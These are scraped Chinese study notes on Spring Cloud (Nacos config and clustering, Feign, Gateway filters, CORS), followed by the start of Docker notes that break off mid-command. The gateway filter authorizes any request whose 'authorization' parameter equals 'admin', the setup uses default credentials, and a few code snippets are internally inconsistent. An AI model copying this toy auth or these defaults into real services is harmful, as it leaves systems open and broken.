@Value(\"${pattern.dateformat}\") private String dateformat; 方式二：使用@ConfigurationProperties注解 去掉@RefreshScope注解和@Value注解 在user-service服务的config包中添加一个类 添加@Component注解和@Data注解 添加@ConfigurationProperties注解 在类中添加相应属性 package cn.itcast.user.config; import lombok.Data; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; @Component @Data //@ConfigurationProperties注解依赖于setter方法 @ConfigurationProperties(prefix = \"pattern\") //一般该注解都会配合prefix前缀名去使用，通知springcloud给属性名与配置文件一致的属性注入值 public class PatternProperties { private String dateformat; private String envSharedValue; private String name; } 在Controller类中使用@Autowired注入这个类 @Slf4j @RestController @RequestMapping(\"/user\") public class UserController { @Autowired private UserService userService; @Autowired private PatternProperties patternProperties; @GetMapping(\"/now\") public String now() { return LocalDateTime.now().format(DateTimeFormatter.ofPattern(patternProperties.getDateformat())); } } 方式三：使用@ConfigurationProperties与@EnableConfigurataion注解加载 配置类中不使用@Component注解 package cn.itcast.user.config; import lombok.Data; import org.springframework.boot.context.properties.ConfigurationProperties; @Data //@ConfigurationProperties注解依赖于setter方法 @ConfigurationProperties(prefix = \"pattern\") //一般该注解都会配合prefix前缀名去使用，通知springcloud给属性名与配置文件一致的属性注入值 public class PatternProperties { private String dateformat; private String envSharedValue; private String name; } Contrller类 @Slf4j @RestController @RequestMapping(\"/user\") @EnableConfigurationProperties(PatternProperties.class)//该语句的效果其实与@Component在注解的效果是一样的 public class UserController { @Autowired private UserService userService; @Autowired private PatternProperties patternProperties; @GetMapping(\"/now\") public String now() { return LocalDateTime.now().format(DateTimeFormatter.ofPattern(patternProperties.getDateformat())); } } 配置共享 添加一个userservice.yaml文件，不管是dev，还是test环境，都可以读取到envSharedValue这个属性的值 pattern: envSharedValue: 公共配置 配置共享的优先级：指定具体环境的最高，共享环境第二，本地的第三 服务名-profile.yaml > 服务名称.yaml > 本地配置 Nacos集群 nacos集群数据共享是基于数据库实现 初始化数据库，==注：要使用mysql5.7以上的版本，5.5运行不了。== ```mysql CREATE DATABASE IF NOT EXISTS nacos; USE nacos; CREATE TABLE config_info ( id bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id', data_id varchar(255) NOT NULL COMMENT 'data_id', group_id varchar(255) DEFAULT NULL, content longtext NOT NULL COMMENT 'content', md5 varchar(32) DEFAULT NULL COMMENT 'md5', gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '修改时间', src_user text COMMENT 'source user', src_ip varchar(50) DEFAULT NULL COMMENT 'source ip', app_name varchar(128) DEFAULT NULL, tenant_id varchar(128) DEFAULT '' COMMENT '租户字段', c_desc varchar(256) DEFAULT NULL, c_use varchar(64) DEFAULT NULL, effect varchar(64) DEFAULT NULL, type varchar(64) DEFAULT NULL, c_schema text, PRIMARY KEY (id), UNIQUE KEY uk_configinfo_datagrouptenant (data_id,group_id,tenant_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info'; /**/ / 数据库全名 = nacos / / 表名称 = config_info_aggr / /**/ CREATE TABLE config_info_aggr ( id bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id', data_id varchar(255) NOT NULL COMMENT 'data_id', group_id varchar(255) NOT NULL COMMENT 'group_id', datum_id varchar(255) NOT NULL COMMENT 'datum_id', content longtext NOT NULL COMMENT '内容', gmt_modified datetime NOT NULL COMMENT '修改时间', app_name varchar(128) DEFAULT NULL, tenant_id varchar(128) DEFAULT '' COMMENT '租户字段', PRIMARY KEY (id), UNIQUE KEY uk_configinfoaggr_datagrouptenantdatum (data_id,group_id,tenant_id,datum_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='增加租户字段'; /**/ / 数据库全名 = nacos / / 表名称 = config_info_beta / /**/ CREATE TABLE config_info_beta ( id bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id', data_id varchar(255) NOT NULL COMMENT 'data_id', group_id varchar(128) NOT NULL COMMENT 'group_id', app_name varchar(128) DEFAULT NULL COMMENT 'app_name', content longtext NOT NULL COMMENT 'content', beta_ips varchar(1024) DEFAULT NULL COMMENT 'betaIps', md5 varchar(32) DEFAULT NULL COMMENT 'md5', gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '修改时间', src_user text COMMENT 'source user', src_ip varchar(50) DEFAULT NULL COMMENT 'source ip', tenant_id varchar(128) DEFAULT '' COMMENT '租户字段', PRIMARY KEY (id), UNIQUE KEY uk_configinfobeta_datagrouptenant (data_id,group_id,tenant_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info_beta'; /**/ / 数据库全名 = nacos / / 表名称 = config_info_tag / /**/ CREATE TABLE config_info_tag ( id bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id', data_id varchar(255) NOT NULL COMMENT 'data_id', group_id varchar(128) NOT NULL COMMENT 'group_id', tenant_id varchar(128) DEFAULT '' COMMENT 'tenant_id', tag_id varchar(128) NOT NULL COMMENT 'tag_id', app_name varchar(128) DEFAULT NULL COMMENT 'app_name', content longtext NOT NULL COMMENT 'content', md5 varchar(32) DEFAULT NULL COMMENT 'md5', gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '修改时间', src_user text COMMENT 'source user', src_ip varchar(50) DEFAULT NULL COMMENT 'source ip', PRIMARY KEY (id), UNIQUE KEY uk_configinfotag_datagrouptenanttag (data_id,group_id,tenant_id,tag_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_info_tag'; /**/ / 数据库全名 = nacos / / 表名称 = config_tags_relation / /**/ CREATE TABLE config_tags_relation ( id bigint(20) NOT NULL COMMENT 'id', tag_name varchar(128) NOT NULL COMMENT 'tag_name', tag_type varchar(64) DEFAULT NULL COMMENT 'tag_type', data_id varchar(255) NOT NULL COMMENT 'data_id', group_id varchar(128) NOT NULL COMMENT 'group_id', tenant_id varchar(128) DEFAULT '' COMMENT 'tenant_id', nid bigint(20) NOT NULL AUTO_INCREMENT, PRIMARY KEY (nid), UNIQUE KEY uk_configtagrelation_configidtag (id,tag_name,tag_type), KEY idx_tenant_id (tenant_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='config_tag_relation'; /**/ / 数据库全名 = nacos / / 表名称 = group_capacity / /**/ CREATE TABLE group_capacity ( id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键ID', group_id varchar(128) NOT NULL DEFAULT '' COMMENT 'Group ID，空字符表示整个集群', quota int(10) unsigned NOT NULL DEFAULT '0' COMMENT '配额，0表示使用默认值', usage int(10) unsigned NOT NULL DEFAULT '0' COMMENT '使用量', max_size int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个配置大小上限，单位为字节，0表示使用默认值', max_aggr_count int(10) unsigned NOT NULL DEFAULT '0' COMMENT '聚合子配置最大个数，，0表示使用默认值', max_aggr_size int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值', max_history_count int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最大变更历史数量', gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '修改时间', PRIMARY KEY (id), UNIQUE KEY uk_group_id (group_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='集群、各Group容量信息表'; /**/ / 数据库全名 = nacos / / 表名称 = his_config_info / /**/ CREATE TABLE his_config_info ( id bigint(64) unsigned NOT NULL, nid bigint(20) unsigned NOT NULL AUTO_INCREMENT, data_id varchar(255) NOT NULL, group_id varchar(128) NOT NULL, app_name varchar(128) DEFAULT NULL COMMENT 'app_name', content longtext NOT NULL, md5 varchar(32) DEFAULT NULL, gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP, gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP, src_user text, src_ip varchar(50) DEFAULT NULL, op_type char(10) DEFAULT NULL, tenant_id varchar(128) DEFAULT '' COMMENT '租户字段', PRIMARY KEY (nid), KEY idx_gmt_create (gmt_create), KEY idx_gmt_modified (gmt_modified), KEY idx_did (data_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='多租户改造'; /**/ / 数据库全名 = nacos / / 表名称 = tenant_capacity / /**/ CREATE TABLE tenant_capacity ( id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键ID', tenant_id varchar(128) NOT NULL DEFAULT '' COMMENT 'Tenant ID', quota int(10) unsigned NOT NULL DEFAULT '0' COMMENT '配额，0表示使用默认值', usage int(10) unsigned NOT NULL DEFAULT '0' COMMENT '使用量', max_size int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个配置大小上限，单位为字节，0表示使用默认值', max_aggr_count int(10) unsigned NOT NULL DEFAULT '0' COMMENT '聚合子配置最大个数', max_aggr_size int(10) unsigned NOT NULL DEFAULT '0' COMMENT '单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值', max_history_count int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最大变更历史数量', gmt_create datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', gmt_modified datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '修改时间', PRIMARY KEY (id), UNIQUE KEY uk_tenant_id (tenant_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='租户容量信息表'; CREATE TABLE tenant_info ( id bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id', kp varchar(128) NOT NULL COMMENT 'kp', tenant_id varchar(128) default '' COMMENT 'tenant_id', tenant_name varchar(128) default '' COMMENT 'tenant_name', tenant_desc varchar(256) DEFAULT NULL COMMENT 'tenant_desc', create_source varchar(32) DEFAULT NULL COMMENT 'create_source', gmt_create bigint(20) NOT NULL COMMENT '创建时间', gmt_modified bigint(20) NOT NULL COMMENT '修改时间', PRIMARY KEY (id), UNIQUE KEY uk_tenant_info_kptenantid (kp,tenant_id), KEY idx_tenant_id (tenant_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='tenant_info'; CREATE TABLE users ( username varchar(50) NOT NULL PRIMARY KEY, password varchar(500) NOT NULL, enabled boolean NOT NULL ); CREATE TABLE roles ( username varchar(50) NOT NULL, role varchar(50) NOT NULL, UNIQUE INDEX idx_user_role (username ASC, role ASC) USING BTREE ); CREATE TABLE permissions ( role varchar(50) NOT NULL, resource varchar(255) NOT NULL, action varchar(8) NOT NULL, UNIQUE INDEX uk_role_permission (role,resource,action) USING BTREE ); INSERT INTO users (username, password, enabled) VALUES ('nacos', '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu', TRUE); INSERT INTO roles (username, role) VALUES ('nacos', 'ROLE_ADMIN'); - 配置Nacos - 创建一个目录名为：nacos-cluster - 进入目录nacos-cluster目录，重新解压安装一份新的nacos - 进入nacos的conf目录，修改配置文件cluster.conf.example，重命名为cluster.conf，编写集群IP 127.0.0.1:8845 127.0.0.1:8846 127.0.0.1:8847 ``` 修改application.properties文件，根据实际情况配置数据库地址、用户名、密码 server.port=8845 nacos.inetutils.ip-address=127.0.0.1 #*************** Config Module Related Configurations ***************# # mysql的数据库集群 spring.datasource.platform=mysql # 数据库的数量 db.num=1 # 连接字符串 db.url.0=jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true&useUnicode=true&useSSL=false&serverTimezone=UTC # 用户名 db.user.0=root # 密码 db.password.0=root 将nacos改名成nacos1，并且复制两份，分别命名为：nacos2、nacos3。修改application.properties文件中的server.port 启动三台Nacos Nginx反向代理 修改conf/nginx.conf文件 upstream nacos-cluster { server 127.0.0.1:8845; server 127.0.0.1:8846; server 127.0.0.1:8847; } server { listen 80; server_name localhost; location / { proxy_pass http://nacos-cluster; } } 启动Nginx服务器 修改userservice服务的bootstrap.yaml文件配置 spring: cloud: nacos: server-addr: localhost:80 # 反向代理后的Nacos地址 Feign远程调用 使用RestTemplate发起远程调用，代码可读性差，编程体验不统一，参数复杂URL难以维护 Feign是一个声明式的http客户端，作用就是优雅的实现http请求的发送 Feign-api 将Feign的Client抽取为独立模块，并且把接口有关的POJO、默认的Feign配置都放到这个模块中，所有微服务引用该依赖包，即可直接使用。 单独创建一个feign-api的模块，继承父模块 导入feign的starter依赖 org.springframework.cloud spring-cloud-starter-openfeign 其他需要使用feign-api的微服务，需要在pom中导入该依赖 cn.itcast.demo feign-api 1.0 解决包扫描问题 UserClient现在在cn.itcast.feign.client包下，而order-service的@EnableFeignClients注解默认扫描的是cn.itcast.order包和它的子包，不在同一个父包中，无法扫描到UserClient。 方式一：指定Feign应该扫描的包，对整个包下所有的接口生成代理对象 @EnableFeignClients(basePackages = \"cn.itcast.feign.client\") 方式二：指定需要加载的Client接口，对指定的接口生成代理对象 @EnableFeignClients(clients = {UserClient.class}) Feign替代RestTemplate 导入依赖 org.springframework.cloud spring-cloud-starter-openfeign 添加注解，在order-service的启动类添加==@EnableFeignClients==注解开启Feign的功能 @MapperScan(\"cn.itcast.order.mapper\") @SpringBootApplication @EnableFeignClients(basePackages = \"cn.itcast.feign.client\") public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } } 注释掉RestTemplate的代码 @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } 编写Feign客户端 在feign-api的模块下创建client包 新建一个==接口==，指定服务名字userservice、访问地址/user/{id}、方法参数id的注入 package cn.itcast.feign.client; import cn.itcast.feign.config.DefaultFeignConfiguration; import cn.itcast.feign.pojo.User; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = \"userservice\",configuration = FeignConfiguration.class) public interface UserClient { @GetMapping(\"/user/{id}\") public User queryById(@PathVariable(\"id\") Long id); } 修改OrderCOntroller的代码，使用feign的客户端去调用 package cn.itcast.order.web; import cn.itcast.feign.client.UserClient; import cn.itcast.feign.pojo.User; import cn.itcast.order.pojo.Order; import cn.itcast.order.service.OrderService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"order\") public class OrderController { @Autowired private OrderService orderService; //注意： 这里注入的是feign接口的代理对象，feign接口的代理对象由springcloud帮你生成。 @Autowired(required = false) private UserClient userClient; @GetMapping(\"{orderId}\") public Order queryOrderByUserId(@PathVariable(\"orderId\") Long orderId) { // 1.根据id查询订单并返回 Order order = orderService.queryOrderById(orderId); //2. 使用用户的id调用user系统，查询用户的对象 //使用feign接口替代了restTemplate，但是底层是一样的 //User user = restTemplate.getForObject(\"http://userservice/user/\" + order.getUserId(), User.class); User user = userClient.findById(order.getUserId()); //3 把User对象封装到Order order.setUser(user); return order; } } 自定义日志配置 一般情况下，默认值就能满足我们使用，如果要自定义时，只需要创建自定义的@Bean覆盖默认Bean即可。 类型 作用 说明 feign.Logger.Level 修改日志级别 包含四种不同的级别：NONE(默认)、BASIC(记录什么时候发出、什么时候结束)、HEADERS（在basic基础还记录请求头信息）、FULL(记录所有的信息) feign.codec.Decoder 响应结果的解析器 http远程调用的结果做解析，例如解析json字符串为java对象 feign.codec.Encoder 请求参数编码 将请求参数编码，便于通过http请求发送 feign.Contract 支持的注解格式 默认是SpringMVC的注解 feign.Retryer 失败重试机制 请求失败的重试机制，默认是没有，不过会使用Ribbon的重试 日志级别 NONE：不记录任何日志信息，这是默认值。 BASIC：仅记录请求的方法，URL以及响应状态码和执行时间 HEADERS：在BASIC的基础上，额外记录了请求和响应的头信息 FULL：记录所有请求和响应的明细，包括头信息、请求体、元数据。 以配置文件的方式 基于配置文件修改feign的日志级别可以针对单个要调用的服务 feign: client: config: userservice: # 针对某个微服务的配置 loggerLevel: BASIC # 日志级别 也可以针对所有服务 feign: client: config: default: # 这里用default就是全局配置，如果是写服务名称，则是针对某个微服务的配置 loggerLevel: FULL # 日志级别 以代码的方式 在config包中，创建一个FeignConfiguration类，声明一个Logger.Level的对象 package cn.itcast.order.config; import feign.Logger; import org.springframework.context.annotation.Bean; public class FeignConfiguration { @Bean public Logger.Level loggerLevel() { // 日志级别为BASIC，这是个枚举类型 return Logger.Level.BASIC; } } 如果要局部生效，则把它放到UserClient接口对应的@FeignClient这个注解中 @FeignClient(value = \"userservice\", configuration = FeignConfiguration.class) 如果要全局生效，将其放到启动类的@EnableFeignClients这个注解中 @EnableFeignClients(defaultConfiguration = FeignConfiguration.class) Feign优化（连接池） Feign底层发起http请求，依赖于其它的框架。其底层客户端实现包括： URLConnection：默认实现，不支持连接池。每次创建连接要三次握手，结束连接还要四次挥手。 Apache HttpClient ：支持连接池 OKHttp：支持连接池 配置连接池 在application.yml中添加配置（默认是开启的，所以就算没有配置也会一些默认的配置参数） 说明：每个不同的微服务连接路径是不同的，如：访问user-service这个微服务就是一条路径，最多有50个连接。通常最大连接数除以一共有多少个微服务，则每个微服务平均占用多少个连接。后期可再根据访问性能的变化进行调整。 feign: httpclient: enabled: true # 开启feign对HttpClient的支持 max-connections: 200 # 最大的连接数 max-connections-per-route: 50 # 每个路径的最大连接数 GateWay服务网关 Gateway网关是所有微服务的统一入口 网关的核心功能特性： 请求路由 权限控制 限流 搭建网关 单独创建一个gateway模块，继承父模块 导入依赖 org.springframework.cloud spring-cloud-starter-gateway com.alibaba.cloud spring-cloud-starter-alibaba-nacos-discovery 编写启动类 package cn.itcast.gateway; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; @SpringBootApplication public class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); } } 在application.yml配置文件，编写基础配置和路由规则 路由规则：将符合Path 规则的一切请求，都代理到 uri参数指定的地址 server: port: 10010 spring: application: name: gateway cloud: gateway: routes: - id: userservicegateway #一个路由的id，可以是随意的。 uri: lb://userservice # 使用负载均衡，把请求转发到userservice这个微服务里面去。lb是LoadBalanced负载均衡的缩写 predicates: - Path=/user/** # 断言（如果用户访问的路径是： /user/下面的任意路径，我就把这个请求路由到lb://userservice这个微服务里面） - id: orderservicegateway uri: lb://orderservice predicates: - Path=/order/** nacos: server-addr: localhost:80 断言工厂 像这样的断言工厂在SpringCloudGateway还有十几个： 名称 说明 示例 After 是某个时间点后的请求 - After=2037-01-20T17:42:47.789-07:00[Asia/Shanghai] Before 是某个时间点之前的请求 - Before=2031-04-13T15:14:47.433+08:00[Asia/Shanghai] Between 是某两个时间点之前的请求 - Between=2037-01-20T17:42:47.789-07:00[Asia/Shanghai], 2037-01-21T17:42:47.789-07:00[Asia/Shanghai] Cookie 请求必须包含某些cookie - Cookie=chocolate, ch.p Header 请求必须包含某些header - Header=X-Request-Id, \\d+ Host 请求必须是访问某个host（域名） - Host=.somehost.org,.anotherhost.org Method 请求方式必须是指定方式 - Method=GET,POST Path 请求路径必须符合指定规则 - Path=/red/{segment},/blue/**多个路径之间使用逗号分隔通过大括号获取路径的{参数}信息 Query 请求参数必须包含指定参数 - Query=name, Jack或者- Query=name RemoteAddr 请求者的ip必须是指定范围 - RemoteAddr=192.168.1.1/24 Weight 权重处理 设置为在某个时间段内才能访问 predicates: - Between=2023-01-29T20:52:00.789-07:00[Asia/Shanghai], 2023-01-29T20:53:00.789-07:00[Asia/Shanghai] 过滤器工厂 Spring提供了31种不同的路由过滤器工厂，例如： 名称 说明 AddRequestHeader 给当前请求添加一个请求头 RemoveRequestHeader 移除请求中的一个请求头 AddResponseHeader 给响应结果中添加一个响应头 RemoveResponseHeader 从响应结果中移除有一个响应头 RequestRateLimiter 限制请求的流量 请求头过滤器 给所有进入userservice的请求添加一个请求头 spring: application: name: gateway cloud: nacos: server-addr: localhost:80 gateway: routes: #配置路径 - id: userservice # 这个路由的id只要唯一即可，不需要与服务名称一致 uri: lb://userservice # lb loadBalance， predicates: # 定义断言 - Path=/user/** - After=2022-01-15T15:00:00.789-07:00[Asia/Shanghai] filters: - AddRequestHeader=name,zhangsan # 给/user/路径的每一个请求都添加了一个请求头name=zhangsan 使用@RequestHeader注解在方法中获取名为name的请求头，为了避免没有这个请求头而报错，将它required设置为false @GetMapping(\"/header\") public String header(@RequestHeader(name = \"name\",required = false) String truth){ return name; } 默认过滤器 如果要对所有的路由都生效，则可以将过滤器工厂写到default-filters下 spring: cloud: gateway: routes: - id: userservice uri: lb://userservice predicates: - Path=/user/** - After=2022-01-14T22:42:00.789-07:00[Asia/Shanghai] default-filters: - AddRequestHeader=name,lisi # 给每一个请求都添加了一个请求头name=lisi 全局过滤器 全局过滤器的作用也是处理一切进入网关的请求和微服务响应，与GatewayFilter的作用一样。区别在于GatewayFilter通过配置定义，处理逻辑是固定的；而GlobalFilter的逻辑需要自己写代码实现。 定义全局过滤器，拦截请求，判断请求的参数是否满足下面条件。在gateway中cn.itcast.gateway.filters包下定义一个过滤器： package cn.itcast.filter; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.annotation.Order; import org.springframework.http.HttpStatus; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.util.MultiValueMap; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import java.util.List; /* 需求： 请求参数必须带有一个authorization请求参数过来，并且值是admin。否则不放行 */ @Order(-1) //存在多个全局过滤器的时候，order的数值越小就会越优先执行 @Component public class AuthorizeFilter implements GlobalFilter { /** * 在这个方法里面就可以坚持浏览器的请求是否带有你指定的标识过来，做身份的验证 */ @Override public Mono filter(ServerWebExchange exchange, GatewayFilterChain chain) { //1. 得到request与response对象、 ServerHttpRequest request = exchange.getRequest(); ServerHttpResponse response = exchange.getResponse(); //2. 得到authorization的请求参数，判断请求参数的值是否为admin，如果是放行，如果不行拦截。 MultiValueMap params = request.getQueryParams(); //所有的请求参数都包含在了该map里面 String token = params.getFirst(\"authorization\"); if(\"admin\".equals(token)){ //放行 return chain.filter(exchange); }else{ response.setStatusCode(HttpStatus.UNAUTHORIZED); //设置状态码是401，代表没有访问的权限 //不放行，提前给响应 return response.setComplete(); } } } 过滤器执行顺序 三类过滤器：DefaultFilter、路由过滤器、GlobalFilter 每一个过滤器都必须指定一个int类型的order值，order值越小，优先级越高，执行顺序越靠前。 GlobalFilter通过实现Ordered接口，或者添加@Order注解来指定order值，由我们自己指定 路由过滤器(局部)和defaultFilter(全局)，它的执行顺序默认是按照声明顺序从1递增。 执行的顺序 defaultFilter > 路由过滤器(局部) > GlobalFilter的顺序执行。 跨域问题 跨域：域名不一致就是跨域，主要包括： 域名不同： www.taobao.com 和 www.jd.com 端口不同：localhost:8080和localhost:8081 协议不同：https://localhost:8080和http://localhost:8080 跨域问题：浏览器禁止请求的发起者与服务端发生跨域==ajax请求==，请求被浏览器拦截的问题 解决跨域问题 因为所有的微服务都要经过网关，所以不需要每个微服务都去处理，在网关中处理就可以了。 CORS方案是浏览器向服务器询问是否允许本次请求跨域，这次询问是options请求，所以要让options请求通过。但如果每次跨域请求都询问，则会导致性能下降，于是设置一个有效期，在有效期内的请求不再每次询问，而是直接允许跨域请求。 在gateway服务的application.yml文件中进行配置 spring: cloud: gateway: # 全局的跨域处理 globalcors: add-to-simple-url-handler-mapping: true # 解决options请求被拦截问题 corsConfigurations: '[/**]': # 哪些访问地址做跨域处理 allowedOrigins: # 允许哪些网站的跨域请求 - \"http://localhost:8080\" allowedMethods: # 允许的跨域ajax的请求方式 - \"GET\" - \"POST\" - \"DELETE\" - \"PUT\" - \"OPTIONS\" allowedHeaders: \"*\" # 允许在请求中携带的头信息 allowCredentials: true # 是否允许携带cookie maxAge: 360000 # 这次跨域检测的有效期 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-24 13:37 "},"Java笔记/Day55-Docker.html":{"url":"Java笔记/Day55-Docker.html","title":"Day55-Docker","keywords":"","body":"虚拟化技术 Docker使用的是一种虚拟化技术。 虚拟化（英语：Virtualization）是一种资源管理技术，是将计算机的各种实体资源，如服务器、网络、内存及存储等，予以抽象、转换后呈现出来，打破实体结构间的不可切割的障碍。这些资源的新虚拟部分是不受现有资源的架设方式，地域或物理组态所限制。 虚拟化架构种类 全虚拟化架构：全虚拟化技术最大特点就是可以虚拟出不同的操作系统。虚拟出来的每一个系统都有独立的系统文件。虚拟出来的操作系统可以与本机操作系统不一样(内核)。 VMware workstation OS层虚拟化架构：虚拟出来的操作系统与本机操作系统一样(内核)。 Docker 硬件层虚拟化架构：虚拟出来的操作系统是没有宿主机操作系统 Docker Docker 是一个开源的应用容器引擎，基于 Go 语言开发。Docker 可以让开发者打包他们的应用以及相关依赖到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间完全隔离， 更重要的是容器性能开销极低 使用Docker可以实现开发人员的开发环境、测试人员的测试环境、运维人员的生产环境的一致性 组成结构 容器：一个独立的操作系统 + 目标软件 镜像：软件的安装包 + 软件的依赖环境 仓库：下载镜像的地方，公共仓库与私服仓库 名称 说明 Docker 镜像 (Images) Docker 镜像是用于创建 Docker 容器的模板。镜像是基于联合文件系统的一种层式结构， 由一系列指令一步一步构建出来(只读不能修改)。 Docker 容器 (Container) 容器是独立运行的一个或一组应用。镜像相当于类，容器相当于类的对象，相当于操作系统 Docker 客户端(Client) Docker 客户端通过命令行或者其他工具使用 Docker API 与 Docker 的守护进程通信。 Docker 主机(Host) 一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。 Docker守护进程 是Docker服务器端进程，负责支撑Docker 容器的运行以及镜像的管理。 Docker 仓库 DockerHub(Registry) Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。 Docker Hub提供了庞大的镜像集合供使用。用户也可以将自己本地的镜像推送到Docker仓库供其他人下载。 Docker安装 注意：建议安装在 CentOS7.x 以上的版本，在 CentOS6.x 的版本中，安装前需要安装其他很多的环境而且Docker很多补丁不支持更新。 在CentOS7中安装Docker的步骤 # 1. yum 更新已有rpm包，升级linux内核(不做也可以) yum update # 2. 安装需要的软件包，yum-util提供yum-config-manager功能，另外两个是devicemapper驱动依赖 yum install -y yum-utils device-mapper-persistent-data lvm2 # 3. 设置yum源为阿里云 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 4. 安装docker【docker-ce: 社区版，免费；docker-ee：企业版，收费】 yum install docker-ce -y # 5. 安装后查看docker版本 docker -v 设置镜像源，创建并编辑文件/etc/docker/daemon.json # 执行如下命令 mkdir /etc/docker vim /etc/docker/daemon.json # 在文件中加入以下内容 { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } # 重启docker systemctl restart docker Docker相关命令 常用命令 # 启动docker服务 systemctl start docker # 停止docker服务 systemctl stop docker # 重启docker服务 systemctl restart docker # 查看docker服务状态 systemctl status docker # 设置开机启动docker服务 systemctl enable docker # 查看docker概要信息 docker info # 查看docker帮助文档 docker --help 镜像相关命令 # 查看镜像 docker images REPOSITORY：镜像名称 TAG：镜像标签 ，镜像版本号 (latest代表是最新版，操作的时候可以省略版本号，其他的不准省略版本号) IMAGE ID：镜像ID CREATED：镜像的创建日期（不是获取该镜像的日期） SIZE：镜像大小 # 从网络中查找需要的镜像，也可以去官方搜索(http://hub.docker.com) docker search 镜像名称 NAME：镜像名称 DESCRIPTION：镜像描述 STARS：用户评价，反应一个镜像的受欢迎程度 OFFICIAL：是否官方 AUTOMATED：自动构建，表示该镜像由Docker Hub自动构建流程创建的 # 拉取镜像就是从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本 命令如下: docker pull 镜像名称 # 拉取centos 7 docker pull centos:7 # 拉取centos 最后版本镜像 docker pull centos:latest # 按照镜像id删除镜像，或者镜像名称:版本号 docker rmi 镜像ID|镜像的名称:版本号 # 删除所有镜像(谨慎操作) docker rmi `docker images -q` 容器相关命令 # 查看正在运行容器 docker ps # 查看所有容器 docker ps -a # 查看最后一次运行的容器 docker ps –l 创建与运行容器 -i：表示运行容器 -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端/bin/bash -d：在run后面加上-d参数, 则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，并指定终端，创建后就会自动进去容器） --name：为创建的容器命名(名称必须唯一) -v：表示目录映射关系（前者是宿主机目录，后者是容器的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上 -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射 # 创建一个交互式容器【第一次启动后会直接进入当前容器，如果退出容器，则容器会变成停止状态】 # 创建并启动名称为 mycentos7 的交互式容器 # 容器名称 mycentos7 # 镜像名称:TAG (centos:7) 也可以使用镜像id (5e35e350aded) # /bin/bash: 进入容器命令行 docker run -it 